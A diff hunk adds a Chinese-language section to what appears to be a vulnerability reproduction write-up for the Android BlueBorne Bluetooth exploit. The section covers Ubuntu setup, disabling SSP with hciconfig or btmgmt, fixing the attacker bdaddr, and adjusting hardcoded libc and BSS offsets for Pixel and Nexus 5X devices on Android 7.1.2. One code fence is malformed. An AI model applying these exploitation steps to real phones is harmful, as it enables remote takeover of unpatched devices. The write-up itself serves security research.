@@ -220,4 +220,52 @@ extension_present是指有扩展，p是有控制信息，rem_len是指还未解�
 
 ## 3. Exploit利用
 ### 3.1 环境搭建
+
+复现整个漏洞最难受的地方就是环境的搭建，尝试了mac windows都不行，最后装了个双系统Ubuntu才能够成功搭建好
+
+依赖安装
+```
+sudo apt-get install libbluetooth-dev bluez python-pip
+sudo pip2 install pybluez pwn
+```
+
+在exp里面，会调用
+```
+hciconfig
+在exp里面，会调用下面这个命令关闭ssp
+```
+hciconfig hci0 sspmode 0
+```
+
+但是intel的蓝牙可能有点问题，不能用上面的命令关闭，需要用以下几条命令去关闭
+```
+hciconfig hci0 down
+btmgmt ssp off
+hciconfig hci0 up
+```
+
+除此以外，在exp里面，每次打exp都会生成随机的bdaddr，但是intel的蓝牙也不支持使用bccmd去修改bdaddr
+
+因此要把exp里面生成随机bdaddr改成固定自己蓝牙的bdaddr
+
 ### 3.2 exp利用及调试
+
+在exp中，硬编码了几个偏移，需要动态的去修改
+
+```
+# For Pixel 7.1.2 patch level Aug/July 2017
+LIBC_TEXT_STSTEM_OFFSET = 0x45f80 + 1 - 56 # system + 1
+LIBC_SOME_BLX_OFFSET = 0x1a420 + 1 - 608 # eventfd_write + 28 + 1
+
+# For Nexus 5X 7.1.2 patch level Aug/July 2017
+#LIBC_TEXT_STSTEM_OFFSET = 0x45f80 + 1
+#LIBC_SOME_BLX_OFFSET = 0x1a420 + 1
+
+# Aligned to 4 inside the name on the bss (same for both supported phones)
+BSS_ACL_REMOTE_NAME_OFFSET = 0x202ee4
+BLUETOOTH_BSS_SOME_VAR_OFFSET = 0x14b244
+```
+
+需要从手机中拖出来so文件，用ida解析去找到对应的偏移，有两个还需要动态调试去找，所以手机需要先root
+
+
